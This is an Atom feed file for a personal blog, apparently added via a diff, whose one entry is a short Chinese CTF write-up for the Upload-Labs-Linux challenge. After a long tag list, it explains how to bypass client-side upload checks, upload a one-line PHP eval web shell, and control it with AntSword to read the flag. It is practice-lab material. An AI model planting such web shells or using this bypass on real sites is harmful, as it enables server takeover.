@@ -1,0 +1,113 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://maxshiroi.top</id>
+    <title>MAXshiro&#39;s Blog • Posts by &#34;buuctf&#34; tag</title>
+    <link href="http://maxshiroi.top" />
+    <updated>2022-10-10T00:52:48.000Z</updated>
+    <category term="nextcloud" />
+    <category term="聊天室" />
+    <category term="python" />
+    <category term="ctf" />
+    <category term="buuctf" />
+    <category term="antsword" />
+    <category term="linux" />
+    <category term="centos" />
+    <category term="web" />
+    <category term="nginx" />
+    <category term="mysql" />
+    <category term="wsa" />
+    <category term="vhd" />
+    <category term="vhdx" />
+    <category term="diskpart" />
+    <category term="arch" />
+    <category term="pacman" />
+    <category term="win" />
+    <category term="explorer.exe" />
+    <category term="autorefresh" />
+    <category term="network" />
+    <category term="vmware" />
+    <category term="kali" />
+    <category term="dvwa" />
+    <category term="fedora" />
+    <category term="helloworld" />
+    <category term="plugin" />
+    <category term="hexo" />
+    <category term="backup" />
+    <category term="guide" />
+    <category term="目录" />
+    <category term="指令" />
+    <category term="权限" />
+    <category term="media center" />
+    <category term="plex" />
+    <category term="emby" />
+    <category term="jellyfin" />
+    <category term="视频" />
+    <category term="音乐" />
+    <category term="运维" />
+    <category term="smb" />
+    <category term="passwd" />
+    <category term="switch" />
+    <category term="animal crossing" />
+    <category term="Project Diva" />
+    <category term="Miku" />
+    <category term="Mega39" />
+    <category term="emulater" />
+    <category term="yuzu" />
+    <category term="ryujinx" />
+    <category term="树莓派" />
+    <category term="docker" />
+    <category term="openwrt" />
+    <category term="router" />
+    <category term="pic" />
+    <category term="img" />
+    <category term="api" />
+    <category term="random" />
+    <category term="wallpaper" />
+    <category term="短链" />
+    <category term="测试" />
+    <category term="Vocal" />
+    <category term="AI" />
+    <category term="歌声合成" />
+    <category term="transmission" />
+    <category term="torrent" />
+    <category term="下载器" />
+    <category term="nas" />
+    <category term="bug" />
+    <category term="win7" />
+    <category term="capacity" />
+    <category term="shrink" />
+    <category term="Android" />
+    <category term="Hyper-V" />
+    <category term="WSA" />
+    <category term="wsl2" />
+    <category term="Hyper-v" />
+    <category term="wsl" />
+    <category term="权限不足" />
+    <category term="vscode" />
+    <entry>
+        <id>http://maxshiroi.top/ug/085248/</id>
+        <title>CTF：Upload-Labs-Linux</title>
+        <link rel="alternate" href="http://maxshiroi.top/ug/085248/"/>
+        <content type="html">&lt;h1 id=&#34;题目预览&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#题目预览&#34;&gt;#&lt;/a&gt; 题目预览：&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;/img/Upload-Labs-Linux/20221010085420.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;解决方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解决方法&#34;&gt;#&lt;/a&gt; 解决方法&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;开控制台&lt;/li&gt;
+&lt;li&gt;关闭 javascript
+&lt;blockquote&gt;
+&lt;p&gt;设置 - 偏好设置 - 调试程序&lt;br&gt;
+删除 &lt;code&gt;onsubmit=&#34;return.checkFile()&#34;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;新建一个文件里面写入 &lt;code&gt;&amp;lt;?php @eval($_POST[&#39;123&#39;]);?&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;后缀名改为 php 上传到网站，显示出图片后右键复制链接。&lt;/li&gt;
+&lt;li&gt;打开 antsword，add 一个 url 地址为图片链接，密码为 123，加密 base64.&lt;/li&gt;
+&lt;li&gt;点击链接就能发现根目录有个 flag 文件了。&lt;/li&gt;
+&lt;/ol&gt;
+</content>
+        <category term="ctf" />
+        <category term="buuctf" />
+        <category term="antsword" />
+        <updated>2022-10-10T00:52:48.000Z</updated>
+    </entry>
+</feed>
